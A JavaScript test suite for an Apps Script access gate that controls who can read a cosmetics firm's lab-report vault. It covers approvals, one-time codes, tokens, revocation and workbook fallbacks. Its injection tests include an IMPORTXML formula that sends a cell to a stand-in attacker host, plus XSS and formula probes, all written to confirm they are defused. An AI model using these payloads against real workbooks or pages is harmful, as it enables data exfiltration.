/* Apps Script will not run here, so the Google services are stubbed and
   doPost is driven for real against an in-memory request sheet and in-memory
   workbooks. The point of most of it is the gate: what a token buys, what it
   stops buying the moment a cell changes, and that the four reasons a refusal
   can have stay distinguishable. */
import fs from 'fs';
const src = fs.readFileSync('/workspace/facerinna-showcase/tools/vault-access.gs','utf8');

/* --- a fake workbook set, shaped exactly like the real tabs --- */
const REQ = { name:'Vault requests', rows: [] };
const books = {
  '1J9QAO7PUO4caLhDBsKMGZ5tofv4Gqy5-QSVlo_hBEso': { byName: { 'Vault requests': REQ } },
  '15eD6XtMVN1BRm41cD9wm33QMwW16R5sS': { byGid: {
     378921450: [['note','ignore me'],
                 ['No.','Code','SKU','Report No','Lab','Date','Subject','Param',
                  'CI','CP','CO','Generic','Disclaimer'],
                 ['1','FMS004','B5','INB/1','INBIOSIS','31 March 2026','subj','par',
                  'none','','other','generic','disc'],
                 ['2','FSS003','Toner','INB/2','Equilab','1 April 2026','s2','p2',
                  'ci2','cp2','','g2','d2'],
                 ['','spacer row that must be dropped']],
     610219740: [['No.','Series','SKUs','Generic','Disclaimer'],
                 ['1','Ceramide B5','a; b','gc','dd']],
     1440505952:[['No.','Code','SKU','Series','Aliases','Reports'],
                 ['1','FMS004','B5','Ceramide B5','none','4']] } },
  '1F1zDeTnSrfZ7j7bIu7FfiHRW0eoXu3_n4NjFAmnWBfE': { byGid: {
     524451717: [['junk'],
                 ['Product Name','SKU Code','Image URL','Test Report URL','Claims URL'],
                 ['B5 MOISTURIZER','FMS004',
                  'https://drive.google.com/file/d/ABC123xyz/view',
                  'https://drive.google.com/file/d/SECRET/view',
                  'https://canva.com/design/SECRET'],
                 ['','','']] } },
};
const mkSheet = o => ({
  getLastRow: () => (o.rows ? o.rows.length : o.grid.length),
  appendRow: r => o.rows.push(r),
  setFrozenRows(){}, setColumnWidth(){}, hideColumns(){},
  getSheetId: () => o.gid,
  getDataRange: () => ({ getDisplayValues: () => o.grid }),
  getRange: (r,c,nr,nc) => {
    /* r is a 1-based SHEET row and rows[] is 0-based, so getRange(2,...) must
       start at rows[1]. Slicing from r-2 started at the header and dropped the
       last data row -- which is how a stub quietly tests something other than
       the code. */
    const put = (ri,ci,v) => { while(o.rows.length<=ri) o.rows.push([]);
                               while(o.rows[ri].length<=ci) o.rows[ri].push('');
                               o.rows[ri][ci]=v; };
    const range = {
      getValues: () => o.rows.slice(r-1, r-1+(nr||1)).map(x => x.slice(c-1, c-1+(nc||1))),
      setValue: v => { for(let i=r-1;i<r-1+(nr||1);i++) put(i,c-1,v); return range; },
      setValues: vals => { vals.forEach((row,i) => row.forEach((v,j) => put(r-1+i, c-1+j, v)));
                           return range; },
      setFontWeight(){ return range; },
    };
    return range;
  },
});
/* A book listed here refuses openById, the way an uploaded .xlsx does. */
const REFUSE_OPEN = new Set();
const SpreadsheetApp = { openById: id => {
  if (REFUSE_OPEN.has(id)) throw new Error('Unexpected error while getting the method or property openById');
  const b = books[id]; if(!b) throw new Error('no book '+id);
  return {
    getSheetByName: n => b.byName && b.byName[n] ? mkSheet(b.byName[n]) : null,
    insertSheet: n => { b.byName = b.byName||{}; b.byName[n]={name:n,rows:[]}; return mkSheet(b.byName[n]); },
    getSheets: () => Object.keys(b.byGid||{}).map(g => mkSheet({gid:Number(g), grid:b.byGid[g]})),
  };
}};
const OWNER = 'owner@facerinna.test';
const mails = [];
/* Every mail lands in mails[]. The two kinds are told apart by filtering, not
   by keeping separate lists: a bug that mailed an approval LINK to the owner
   would vanish into a separate list and show up here. */
const links   = () => mails.filter(x => x.to !== OWNER);
const notices = () => mails.filter(x => x.to === OWNER);
let MAIL_BREAK = null;                 /* an address the mail server refuses */
const MailApp = { sendEmail: o => {
                    if(/^bounce@/.test(o.to) || o.to === MAIL_BREAK) throw new Error('bounced');
                    mails.push(o); },
                  getRemainingDailyQuota: () => 100 };
let LOCK_FREE = true;
const LockService = { getScriptLock: () => ({
  waitLock(){}, releaseLock(){ LOCK_FREE = true; },
  /* tryLock must be able to say no, or the lock is not under test at all. */
  tryLock(){ if(!LOCK_FREE) return false; LOCK_FREE = false; return true; } }) };

/* Installable triggers, kept in a list so stacking is visible. */
const TRIGGERS = [];
const ScriptApp = {
  newTrigger: fn => { const t={fn, kind:null};
    const b = { forSpreadsheet(){ t.kind="edit-book"; return b; },
                onEdit(){ return b; },
                timeBased(){ t.kind="timer"; return b; },
                everyMinutes(n){ t.mins=n; return b; },
                create(){ TRIGGERS.push(t); return t; } };
    return b; },
  getProjectTriggers: () => TRIGGERS.map(t => ({
    getHandlerFunction: () => t.fn, _t: t })),
  getService: () => ({ getUrl: () => 'https://script.example/exec' }),
  getOAuthToken: () => 'owner-oauth-token',
  deleteTrigger: h => { const i = TRIGGERS.indexOf(h._t); if(i>=0) TRIGGERS.splice(i,1); },
};
const ContentService = { MimeType:{JSON:'j'}, createTextOutput: s => ({ setMimeType: () => s }) };
/* The CSV export, answered from the same in-memory books. EXPORT_CODE lets a
   test make it refuse too. */
let EXPORT_CODE = 200; const FETCHED = [];
const toCsv = grid => grid.map(r => r.map(v => /[",\n]/.test(String(v)) ? '"'+String(v).replace(/"/g,'""')+'"' : String(v)).join(',')).join('\n');
const UrlFetchApp = { fetch: (url, opt) => {
  FETCHED.push({ url, auth: opt && opt.headers && opt.headers.Authorization });
  const m = url.match(/spreadsheets\/d\/([^/]+)\/export\?format=csv&gid=(\d+)/);
  const grid = m && books[m[1]] && books[m[1]].byGid && books[m[1]].byGid[m[2]];
  const code = grid ? EXPORT_CODE : 404;
  return { getResponseCode: () => code, getContentText: () => grid ? toCsv(grid) : '' };
}};
const DriveApp = { getFileById: id => ({ getMimeType: () => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' }) };
let uuid = 0;
/* Shaped like a real UUID, because the code now checks that shape before it
   will act on a key. A stub returning 'tok-1' let the tests agree with each
   other while disagreeing with Apps Script. The counter stays in the last
   block so a value is still traceable by eye. */
let SLEPT = [];
const Utilities = { getUuid: () => '00000000-0000-4000-8000-' + String(++uuid).padStart(12,'0'),
                    formatDate: d => d.toISOString().slice(0,10),
                    sleep: ms => SLEPT.push(ms),
                    DigestAlgorithm: { SHA_256: 'sha256' },
                    /* not a real digest, but a real one-way-ish mapping: what
                       the tests need is that the stored value is NOT the code
                       and that the same input maps to the same output. */
                    computeDigest: (alg, str) => Array.from(String(str)).map(c=>c.charCodeAt(0)),
                    base64Encode: bytes => Buffer.from(bytes).toString('base64'),
                    parseCsv: text => {
                      const rows=[]; let row=[], f='', q=false;
                      for (let i=0;i<text.length;i++){ const c=text[i];
                        if(q){ if(c==='"'){ if(text[i+1]==='"'){f+='"';i++;} else q=false; } else f+=c; }
                        else if(c==='"') q=true; else if(c===','){row.push(f);f='';}
                        else if(c==='\n'){row.push(f);rows.push(row);row=[];f='';} else f+=c; }
                      row.push(f); rows.push(row); return rows; } };
const PROPS = {};
const PropertiesService = { getScriptProperties: () => ({
  getProperty: k => (k in PROPS ? PROPS[k] : null),
  setProperty: (k,v) => { PROPS[k] = String(v); },
  deleteProperty: k => { delete PROPS[k]; } }) };
const Session = { getScriptTimeZone: () => 'UTC',
                  getEffectiveUser: () => ({ getEmail: () => 'owner@facerinna.test' }) };
const Logger = { log(){} };
/* HtmlService pages come back as their raw markup so a test can look at them. */
const HtmlService = { createHtmlOutput: h => ({ setTitle: () => h }) };

const m = eval(`(() => { ${src}
  return { doPost, doGet, setUp, sendApprovals, preview, checkWorkbooks, readVault_,
           onSheetEdit, installTriggers, removeTriggers, decideFromPage }; })()`);

const call = o => JSON.parse(m.doPost({ postData:{ contents: JSON.stringify(o), type:'text/plain' } }));
const codeOf = () => {
  const m2 = mails.filter(x => /vault code/i.test(x.subject || '')).pop();
  return m2 ? (String(m2.subject).match(/(\d{6})/) || [])[1] : null;
};
/* Email, then the code that arrives, as a person does it on the page. The
   one-a-minute spacing is cleared first, so a second device can sign in
   straight away in a test. */
const signIn = email => {
  delete PROPS['code:' + email];
  call({action:'code', email});
  return call({action:'redeem', email, code:String(codeOf())});
};
let ok = true;
const check = (l,c) => { if(!c) ok=false; console.log((c?'  PASS  ':'  FAIL  ')+l); };
const statusCell = (email, v) => {
  const r = REQ.rows.find(x => String(x[2]).toLowerCase() === email);
  r[4] = v; return r;
};

m.setUp();

console.log('asking for access');
check('a request is accepted',
  call({action:'request',name:'Dr Lim',email:'lim@clinic.my',organisation:'Clinic',consent:true}).ok === true);
check('it lands in the sheet as pending',
  REQ.rows.length === 2 && String(REQ.rows[1][4]) === 'pending');
check('asking twice does not make a second row',
  call({action:'request',name:'Dr Lim',email:'LIM@clinic.my',organisation:'',consent:true}).already === true
  && REQ.rows.length === 2);

console.log('\nwhat it refuses to accept');
check('no name',      call({action:'request',name:'',email:'a@b.com',consent:true}).ok === false);
check('bad email',    call({action:'request',name:'X',email:'not-an-email',consent:true}).ok === false);
check('no consent',   call({action:'request',name:'X',email:'x@y.com',consent:false}).ok === false);
check('unknown action', call({action:'whatever'}).ok === false);

console.log('\nbefore approval, nothing is readable');
check('no token at all',        call({action:'data',token:''}).reason === 'unknown');
check('a made-up token',        call({action:'data',token:'tok-999'}).reason === 'unknown');
check('status says pending',    call({action:'status',email:'lim@clinic.my'}).status === 'pending');
check('an address nobody knows',call({action:'status',email:'who@nowhere.com'}).status === 'none');

console.log('\napproving in the sheet, then sending');
statusCell('lim@clinic.my','approved');
check('nothing sent until sendApprovals runs', links().length === 0);
const r1 = m.sendApprovals();
check('one mail went out',      links().length === 1);
check('to the right person',    links()[0].to === 'lim@clinic.my');
check('the approval mail carries no key -- nothing to land in the wrong browser',
      !/#vault=/.test(links()[0].htmlBody) &&
      !/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i.test(links()[0].htmlBody));
check('it tells them to sign in at the vault with their email and a code',
      links()[0].htmlBody.includes('https://my.facerinna.com/facerinna-test-reports-claims/') &&
      /six-digit code/.test(links()[0].htmlBody) && links()[0].htmlBody.includes('lim@clinic.my'));
check('no token is minted at approval; a device mints it by signing in',
      String(REQ.rows[1][5] || '') === '');
check('running it again sends nothing more', (m.sendApprovals(), links().length === 1));

const SIGNED = signIn('lim@clinic.my');
check('signing in with email and code hands back a token', SIGNED.ok === true && !!SIGNED.token, SIGNED);
const TOKEN = SIGNED.token;

console.log('\nwith the token, the reports arrive');
const d = call({action:'data',token:TOKEN});
check('ok',            d.ok === true);
check('reports read',  d.reports.length === 2);
check('the spacer row was dropped', d.reports.every(r => r.no > 0));
check('"none" became empty, as the build does', d.reports[0].claimsInstrument === '');
check('series read',   d.series.length === 1);
check('skus read',     d.skus.length === 1 && d.skus[0].reportCount === 4);
check('thumbs read',   d.thumbs.length === 1);
check('a Drive file link became a thumbnail link',
      d.thumbs[0].img === 'https://drive.google.com/thumbnail?id=ABC123xyz&sz=w800');
check('the internal Test Report URL is NOT returned',
     !JSON.stringify(d).includes('SECRET'));
check('it says who it let in', d.who === 'Dr Lim');

console.log('\nrevoking is one cell');
statusCell('lim@clinic.my','revoked');
check('the same token now fails', call({action:'data',token:TOKEN}).reason === 'revoked');
statusCell('lim@clinic.my','approved');
check('and putting it back works', call({action:'data',token:TOKEN}).ok === true);

console.log('\nno clock on a sign-in');
REQ.rows[1][6] = new Date(Date.now() - 400 * 86400000);
check('an "expires" date long past is ignored: still signed in', call({action:'data',token:TOKEN}).ok === true);
REQ.rows[1][6] = '';
const second = signIn('lim@clinic.my');
check('a second device signing in gets the same token, so one row is one door',
      second.ok === true && second.token === TOKEN, second);

console.log('\na send that bounces does not mark the row as sent');
call({action:'request',name:'Bad',email:'bounce@nowhere.com',organisation:'',consent:true});
statusCell('bounce@nowhere.com','approved');
const before = links().length;
const r2 = m.sendApprovals();
check('no mail recorded',        links().length === before);
check('the row is not marked told, so the next run retries',
      String(REQ.rows.find(x=>x[2]==='bounce@nowhere.com')[7] || '') === '');
check('and it says which address failed', /bounce@nowhere\.com/.test(r2));

console.log('\nGET tells you the deployment is alive without revealing anything');
const g = JSON.parse(m.doGet());
check('ok', g.ok === true);
check('carries no report data', !JSON.stringify(g).includes('INB/'));

console.log('\nyou are told when somebody asks');
const nBefore = notices().length;
call({action:'request',name:'Nurul A',email:'nurul@hosp.my',organisation:'Hosp KL',consent:true});
check('a notice goes out',        notices().length === nBefore + 1);
const notice = notices()[notices().length-1];
check('it names the person',      /Nurul A/.test(notice.htmlBody));
check('and their address',        /nurul@hosp\.my/.test(notice.htmlBody));
check('and their organisation',   /Hosp KL/.test(notice.htmlBody));
check('it links to the workbook', notice.htmlBody.includes('docs.google.com/spreadsheets/d/'));
check('it carries no token',      !/#vault=/.test(notice.htmlBody));
check('asking again does not notify again',
      (call({action:'request',name:'Nurul A',email:'nurul@hosp.my',consent:true}),
       notices().length === nBefore + 1));

console.log('\na notice that will not send must not lose the request');
MAIL_BREAK = OWNER;
const rowsBefore = REQ.rows.length;
const rq = call({action:'request',name:'Tan',email:'tan@x.my',organisation:'',consent:true});
MAIL_BREAK = null;
check('the visitor still gets ok',  rq.ok === true);
check('and the row is still written', REQ.rows.length === rowsBefore + 1);

console.log('\napproving is one cell: the edit trigger');
statusCell('tan@x.my','approved');
const editOn = (sheet,col,row,val) => m.onSheetEdit({ value: val, range: {
  getSheet: () => ({ getName: () => sheet }), getColumn: () => col, getRow: () => row } });
let L = links().length;
editOn('Scores', 5, 4, 'approved');
check('an edit on another tab does nothing', links().length === L);
editOn('Vault requests', 4, 4, 'approved');
check('an edit on another column does nothing', links().length === L);
editOn('Vault requests', 5, 1, 'approved');
check('an edit on the header row does nothing', links().length === L);
editOn('Vault requests', 5, 4, 'pending');
check('any other status does nothing', links().length === L);
editOn('Vault requests', 5, 4, ' Approved ');
check('approving sends the mail, spacing and case aside', links().length === L + 1);
check('it went to the person approved', links()[links().length-1].to === 'tan@x.my');
check('a malformed event is survived, not thrown',
      (m.onSheetEdit(undefined), m.onSheetEdit({}), true));

console.log('\ntwo runs at once must not issue two keys');
call({action:'request',name:'Race',email:'race@x.my',organisation:'',consent:true});
statusCell('race@x.my','approved');
const held = LockService.getScriptLock(); held.tryLock(1);   /* another run has it */
L = links().length;
const busy = m.sendApprovals();
check('the second run declines', links().length === L && /already sending/.test(busy));
held.releaseLock();
check('and once free the mail goes', (m.sendApprovals(), links().length === L + 1));

console.log('\ntriggers install once, not once per run');
check('two triggers',   (m.installTriggers(), TRIGGERS.length === 2));
check('one edit, one timer',
      TRIGGERS.filter(t=>t.kind==='edit-book').length === 1 &&
      TRIGGERS.filter(t=>t.kind==='timer' && t.mins === 5).length === 1);
check('installing again does not stack them',
      (m.installTriggers(), TRIGGERS.length === 2));
check('and they can be taken away', (m.removeTriggers(), TRIGGERS.length === 0));

console.log('\ndeciding from the notice itself');
const keyOf = email => String(REQ.rows.find(x => String(x[2]).toLowerCase() === email)[9] || '');
call({action:'request',name:'Siti <b>R</b>',email:'siti@derm.my',organisation:'Derm KL',consent:true});
const K = keyOf('siti@derm.my');
const notice2 = notices()[notices().length-1];
check('the row carries a decision key',   /^[0-9a-f-]{36}$/i.test(K));
check('the notice offers Approve',        notice2.htmlBody.includes('do=approve'));
check('and Decline',                      notice2.htmlBody.includes('do=decline'));
check('both carry that row key',
      !!K && (notice2.htmlBody.match(new RegExp('k=' + K, 'g')) || []).length === 2);
check('the visitor name is escaped in it', !/<b>R<\/b>/.test(notice2.htmlBody));

console.log('\nopening a button link decides nothing on its own');
const before2 = links().length;
const pg = m.doGet({ parameter: { k: K, do: 'approve' } });
check('a page is drawn, not JSON',   /Approve this request\?/.test(pg));
check('it says who it is about',     /siti@derm\.my/.test(pg));
check('the status is untouched',     REQ.rows.find(x=>x[2]==='siti@derm.my')[4] === 'pending');
check('and no link was mailed',      links().length === before2);

console.log('\nkeys that are not ours');
check('an unknown key', /not valid/.test(m.doGet({ parameter:{ k:'11111111-2222-3333-4444-555555555555' } })));
check('a key that is not a uuid', /not valid/.test(m.doGet({ parameter:{ k:'nope' } })));
const inj = m.doGet({ parameter:{ k:'"+alert(1)+"' } });
check('a crafted key is never echoed into the page', !inj.includes('alert(1)'));
check('decideFromPage refuses it too',
      (m.decideFromPage('"+alert(1)+"','approve'), /not valid/.test(m.decideFromPage('nope','approve'))));
/* A row written before the key column existed: nine cells, nothing in the
   tenth. An empty key must not match it, or "decide" with no key at all would
   approve the oldest undecided stranger in the list. */
REQ.rows.push([new Date(),'Legacy','legacy@old.my','Old','pending','','','','']);
const oldRow = REQ.rows[REQ.rows.length-1];
check('an empty key matches nothing',
      /not valid/.test(m.decideFromPage('', 'approve')) && oldRow[4] === 'pending');
check('and so does a blank-ish one',
      /not valid/.test(m.decideFromPage('   ', 'approve')) && oldRow[4] === 'pending');

/* The page and the button must agree on what a key is. If the page will draw
   for a value the button then refuses, you get a dead end: a real Approve
   screen for a real person, and pressing it says the link is not valid. The
   way that happens is somebody typing into the hidden key column. */
REQ.rows.push([new Date(),'Typo','typo@old.my','Org','pending','','','','','not-a-uuid']);
check('a page is not drawn for a key the button would refuse',
      /not valid/.test(m.doGet({ parameter:{ k:'not-a-uuid', do:'approve' } })));

console.log('\npressing the button on that page');
const before3 = links().length;
const said = m.decideFromPage(K, 'approve');
check('it says they were told',  /siti@derm\.my has been emailed how to sign in/.test(said));
check('the row is approved',      REQ.rows.find(x=>x[2]==='siti@derm.my')[4] === 'approved');
check('and one mail went out',    links().length === before3 + 1);
check('to the person, not to you', links()[links().length-1].to === 'siti@derm.my');

console.log('\ndeclining');
call({action:'request',name:'Nope',email:'nope@x.my',organisation:'',consent:true});
const K2 = keyOf('nope@x.my');
const before4 = links().length;
const said2 = m.decideFromPage(K2, 'decline');
check('it says declined',       /Declined/.test(said2));
check('the row says declined',  REQ.rows.find(x=>x[2]==='nope@x.my')[4] === 'declined');
check('and nothing was mailed', links().length === before4);
check('an unknown decision is refused', /Unknown decision/.test(m.decideFromPage(K2,'maybe')));

console.log('\na tab set up by the older version gains the new column');
REQ.rows[0] = REQ.rows[0].slice(0, 9);
m.setUp();
check('the header row is ten wide again', REQ.rows[0].length === 10);
check('and the last one is the key',      REQ.rows[0][9] === 'key');

console.log('\nwhat a stranger types cannot become a formula in the workbook');
/* =IMPORTXML(...) in a name field is not text once the workbook is opened: it
   runs, as us, and can send a neighbouring cell to whoever wrote it. */
call({action:'request', name:'=IMPORTXML("https://evil.test/?"&B2,"//a")',
      email:'formula@clinic.my', organisation:'@SUM(A1:A9)', consent:true});
const row = REQ.rows.find(x => String(x[2]) === 'formula@clinic.my');
check('a name that starts with = is stored as text', row && String(row[1]).charAt(0) === "'", row && row[1]);
check('...and so is an organisation that starts with @', row && String(row[2 - 1 + 2]).charAt(0) === "'", row && row[3]);
check('an ordinary name is left exactly as it was',
  REQ.rows.some(x => String(x[1]) === 'Dr Lim'), REQ.rows.map(x=>x[1]));
check('an address that would be a formula is refused outright',
  call({action:'request', name:'X', email:'=cmd@evil.test', consent:true}).ok === false);

/* ------------------------------------------------------- the one-time code
   The mailed link is per-browser: it lands wherever the mail was opened, which
   at a booth is the mail app's own webview rather than the browser in the
   visitor's hand. The code is the way in from any device, so what matters here
   is that it buys the SAME token a link would, once, and that none of the
   things it must not do become possible along the way. */
console.log('\na one-time code, for a device the link never reached');
REQ.rows.push([new Date(), 'Coded', 'coded@clinic.my', '', 'approved', '', '', '', '', '']);

const c1 = call({action:'code', email:'coded@clinic.my'});
check('an approved address is sent a code', c1.ok === true && c1.status === 'sent');
const CODE = codeOf();
check('the mail carries six digits', /^\d{6}$/.test(String(CODE)), CODE);
check('the mail went to the address on the row, not to whoever asked',
  mails.filter(x=>/vault code/i.test(x.subject||'')).pop().to === 'coded@clinic.my');
check('the stored copy is not the code itself',
  !Object.keys(PROPS).some(k => String(PROPS[k]).indexOf(String(CODE)) >= 0), PROPS);

console.log('\nwhat the code will not do');
check('a pending address is told so, and gets no code',
  (() => { REQ.rows.push([new Date(),'Waiting','waiting@clinic.my','', 'pending','','','','','']);
           const before = mails.length;
           const r = call({action:'code', email:'waiting@clinic.my'});
           return r.status === 'pending' && mails.length === before; })());
check('an address nobody asked for gets nothing at all',
  (() => { const before = mails.length;
           const r = call({action:'code', email:'stranger@nowhere.my'});
           return r.status === 'none' && mails.length === before; })());
check('a second code inside the minute re-sends nothing',
  (() => { const before = mails.length;
           const r = call({action:'code', email:'coded@clinic.my'});
           return r.ok === true && r.already === true && mails.length === before; })());
check('...so the code already typed out stays the one that works',
  codeOf() === CODE);

console.log('\nspending it');
SLEPT = [];
const bad1 = call({action:'redeem', email:'coded@clinic.my', code:'000000'});
check('a wrong code is refused', bad1.ok === false && bad1.reason === 'badcode', bad1);
check('...and says how many tries are left', bad1.left === 4, bad1);
check('...and costs time, so six digits cannot be walked through', SLEPT.length === 1 && SLEPT[0] > 0, SLEPT);
let reasons = [];
check('the wait is capped low, so it cannot itself be the attack',
  (() => { SLEPT=[]; reasons=[];
           for(let i=0;i<8;i++) reasons.push(call({action:'redeem', email:'coded@clinic.my', code:'000001'}).reason);
           return Math.max(...SLEPT) <= 2000; })(), SLEPT);
check('the guesses run out rather than going on for ever', reasons.indexOf('toomany') >= 0, reasons);
/* and the code is gone, not merely locked: the RIGHT digits buy nothing now */
check('too many wrong tries throws the code away, right digits and all',
  call({action:'redeem', email:'coded@clinic.my', code:String(CODE)}).ok === false);

/* a fresh one, since that one is dead */
PROPS['code:coded@clinic.my'] = undefined; delete PROPS['code:coded@clinic.my'];
call({action:'code', email:'coded@clinic.my'});
const CODE2 = codeOf();
const good = call({action:'redeem', email:'coded@clinic.my', code:String(CODE2)});
check('the right code hands back a token', good.ok === true && !!good.token, good);
check('...written on the row, the one token every device of theirs shares',
  REQ.rows.find(x=>x[2]==='coded@clinic.my')[5] === good.token);
check('...and that token reads the vault',
  (() => { const d = call({action:'data', token:good.token}); return d.ok === true && d.reports.length > 0; })());
check('a spent code cannot be spent twice',
  call({action:'redeem', email:'coded@clinic.my', code:String(CODE2)}).reason === 'nocode');

console.log('\nthe row still decides, not the code');
call({action:'code', email:'coded@clinic.my'});
PROPS['code:coded@clinic.my'] = JSON.stringify({
  ...JSON.parse(PROPS['code:coded@clinic.my']), made: 0 });
call({action:'code', email:'coded@clinic.my'});
const CODE3 = codeOf();
REQ.rows.find(x=>x[2]==='coded@clinic.my')[4] = 'revoked';
check('a code minted while approved is worthless once the row is revoked',
  call({action:'redeem', email:'coded@clinic.my', code:String(CODE3)}).reason === 'revoked');
REQ.rows.find(x=>x[2]==='coded@clinic.my')[4] = 'approved';

console.log('\na token from before, with an old expiry date, is kept rather than replaced');
const rr = REQ.rows.find(x=>x[2]==='coded@clinic.my');
const OLD = rr[5]; rr[6] = new Date(Date.now() - 86400000);
const again = signIn('coded@clinic.my');
check('signing in again hands back the same token', again.ok === true && again.token === OLD, again);
check('...and it still reads the vault, so no device already signed in is dropped',
      call({action:'data', token:OLD}).ok === true);

console.log('\ndeleting the row is what ends it, on every device at once');
const at = REQ.rows.findIndex(x=>x[2]==='coded@clinic.my');
const gone = REQ.rows.splice(at, 1)[0];
const after = call({action:'data', token:OLD});
check('the token is refused as unknown once the row is gone', after.ok === false && after.reason === 'unknown', after);
check('...and no code is sent to the address any more',
      (() => { delete PROPS['code:coded@clinic.my']; const before = mails.length;
               const r = call({action:'code', email:'coded@clinic.my'});
               return r.status === 'none' && mails.length === before; })());
REQ.rows.push([new Date(), 'Coded', 'coded@clinic.my', '', 'approved', '', '', '', '', '']);
const back = signIn('coded@clinic.my');
check('a row added back later signs in with a NEW token', back.ok === true && back.token !== OLD, back);
check('...and the old token stays dead', call({action:'data', token:OLD}).ok === false);

console.log('\na workbook that will not open');
/* The likely reason a correct code still ended at the request form: the
   token was fine, the reports workbook would not open, the error came back
   with no reason, and the page read that as "not let in". */
REFUSE_OPEN.add('15eD6XtMVN1BRm41cD9wm33QMwW16R5sS');
FETCHED.length = 0;
const viaCsv = call({action:'data', token:back.token});
check('a book openById refuses is read through its CSV export instead',
      viaCsv.ok === true && viaCsv.reports.length === 2 && viaCsv.series.length === 1, viaCsv);
check('...asked with the owner\'s own sign-in, so an unshared book still answers',
      FETCHED.length > 0 && FETCHED.every(f => f.auth === 'Bearer owner-oauth-token'));
check('...and the rows come out the same as the native read',
      viaCsv.reports[0].claimsInstrument === '' && viaCsv.skus[0].reportCount === 4);
EXPORT_CODE = 403;
const failed = call({action:'data', token:back.token});
check('when neither route works it says readfail -- not unknown, not revoked',
      failed.ok === false && failed.reason === 'readfail', failed);
check('...and the answer names no workbook, since the page must never carry one',
      !/15eD6X|1F1zDe|1J9QAO|spreadsheets\/d\//.test(JSON.stringify(failed)));
check('checkWorkbooks says why, for the owner in the editor',
      /NOT READABLE/.test(m.checkWorkbooks()) && /spreadsheetml|would not open/.test(m.checkWorkbooks()));
EXPORT_CODE = 200; REFUSE_OPEN.clear();
check('...and says OK once it can read again', /^OK: reports 2/.test(m.checkWorkbooks()));

console.log(ok ? '\nall good' : '\nSOMETHING IS WRONG');
process.exit(ok ? 0 : 1);
